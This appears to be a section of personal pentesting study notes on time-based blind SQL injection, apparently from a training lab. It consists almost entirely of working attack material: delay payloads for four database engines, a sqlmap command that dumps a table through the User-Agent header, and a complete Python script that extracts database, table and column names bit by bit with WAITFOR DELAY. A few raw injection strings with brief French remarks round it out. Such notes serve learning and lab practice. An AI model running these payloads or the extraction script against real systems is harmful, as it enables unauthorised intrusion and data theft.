\section{Time based Injection}
\subsection{Introduction}
A  time-based blind SQL Injection is very similar to the above Boolean  based, in that the same requests are sent, but there is no visual  indicator of your queries being wrong or right this time. Instead, your  indicator of a correct query is based on the time the query takes to  complete. This time delay is introduced by using built-in methods such  as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

\begin{verbatim}
Database 	        Payload
MSSQL 	            WAITFOR DELAY '0:0:10'
MySQL/MariaDB 	    AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')
PostgreSQL 	        || (SELECT 1 FROM PG_SLEEP(10))
Oracle 	            AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)
\end{verbatim}

\subsection{SQLMap}
\begin{verbatim}
$ sqlmap -u http://10.129.204.197:8080/ \
    --technique=T \
    -p User-Agent --level=5 --risk=3 \
    --dbms='Microsoft SQL Server' \
    -D digcraft -T flag --dump
 
\end{verbatim}


\subsection{Oracle}

\begin{verbatim}
import requests
import time
DELAY = 1

def oracle(q):
    start = time.time()
    r = requests.get(
        "http://SERVER_IP:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

db_name_length = dumpNumber("LEN(DB_NAME())")

# Dump a string
def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

db_name = dumpString("DB_NAME()", db_name_length)
\end{verbatim}

\begin{verbatim}
num_tables = dumpNumber("SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='digcraft'")
print(num_tables)
for i in range(num_tables):
    table_name_length = dumpNumber(f"select LEN(table_name) from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only")
    print(table_name_length)
    table_name = dumpString(f"select table_name from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only", table_name_length)
    print(table_name)

num_columns = dumpNumber("select count(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft'")
print(num_columns)

for i in range(num_columns):
    column_name_length = dumpNumber(f"select LEN(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset {i} rows fetch next 1 rows only")
    print(column_name_length)
    column_name = dumpString(f"select column_name from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset {i} rows fetch next 1 rows only", column_name_length)
    print(column_name)
\end{verbatim}




field enumération

\begin{verbatim}
admin123' UNION SELECT SLEEP(5);--
\end{verbatim}
si prend 5 sec c'est que c'est bon

\begin{verbatim}
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
\end{verbatim}



\subsection{cmd, file, etc}
adapt
